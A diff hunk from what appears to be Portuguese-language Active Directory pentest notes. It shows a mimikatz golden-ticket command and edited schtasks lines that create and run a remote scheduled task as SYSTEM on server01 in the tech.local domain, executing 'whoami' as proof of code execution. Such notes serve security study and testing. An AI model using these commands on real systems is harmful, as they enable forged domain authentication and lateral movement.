@@ -1383,11 +1383,13 @@ kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-43397997
 ```
 CRIAR TAREFA AGENDADA
 ```
-schtasks /create /S server02 /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "STCHECK" /TR "cmd /c whoami > c:\eu.txt"
+schtasks /create /S server01 /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "STCHECK" /TR "cmd /c whoami > c:\eu.txt"
+schtasks /create /S server01.tech.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "STCHECK" /TR "cmd /c whoami > c:\eu.txt"
 ```
 RODAR TAREFA AGENDADA
 ```
-schtasks /RUN /S server02 /TN "STCHECK"
+schtasks /RUN /S server01 /TN "STCHECK"
+schtasks /RUN /S server01.tech.local /TN "STCHECK"
 ```
 
 
